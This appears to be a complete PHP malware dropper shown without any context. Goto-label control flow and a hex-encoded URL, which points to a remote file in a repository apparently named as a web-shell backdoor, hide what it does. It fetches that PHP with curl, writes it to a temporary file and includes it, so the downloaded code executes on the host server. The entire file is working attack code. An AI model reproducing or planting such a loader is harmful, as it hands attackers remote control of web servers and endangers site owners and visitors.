<?php

goto Label1;
Label1: 
    $tempFile = tmpfile(); 
    $hexUrl = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f616c61726369646b2f5765627368656c6c6261636b646f6f722f6d61696e2f6179616e65332e706870"; 
    goto Label2;

Label2: 
    $url = hex2bin($hexUrl);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);
    
    if ($data === false) {
        die('Error fetching the remote content.');
    }

    fwrite($tempFile, $data);
    goto Label3;

Label3: 
    include stream_get_meta_data($tempFile)["uri"]; 
    fclose($tempFile);
